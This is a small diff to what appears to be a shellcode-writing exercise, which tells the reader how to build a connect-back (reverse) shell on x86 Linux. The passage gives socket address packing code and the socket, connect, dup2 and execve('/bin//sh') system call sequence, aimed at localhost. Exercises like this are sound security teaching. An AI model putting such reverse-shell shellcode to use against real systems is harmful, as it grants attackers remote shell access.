@@ -222,13 +222,13 @@ To perform the connect(2) system call, you would need to set eax to 0x66, ebx to
     p += (socket.htons(2).to_bytes(2, 'big') + <connect_port>.to_bytes(2, 'big')) # AF_INET and PORT
     p += pack('<I', 0x0100007f) # Load the Localhost IP address
 
-In essence you want to make the following system calls  :
+In essence you want to make the following system calls (new_sock represents the socket file descriptor returned by the socket(2) call) :
     
-    socket(PF_INET(0x2), SOCK_STREAM(0x1), IPPROTO_TCP(0x0)) = 5;
-    connect(5, {sa_family=AF_INET(0x2), sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = 0;
-    dup2(5, 0);
-    dup2(5, 1);
-    dup2(5, 2);
+    socket(PF_INET(0x2), SOCK_STREAM(0x1), IPPROTO_TCP(0x0)) = new_sock;
+    connect(new_sock, {sa_family=AF_INET(0x2), sin_port=htons(<connect_port>), sin_addr=inet_addr("127.0.0.1")}, 16) = 0;
+    dup2(new_sock, 0);
+    dup2(new_sock, 1);
+    dup2(new_sock, 2);
     execve("/bin//sh", [], [/* 6 vars */])
     
 You can reuse code from previous tasks for the `dup2` and `execve` system calls.
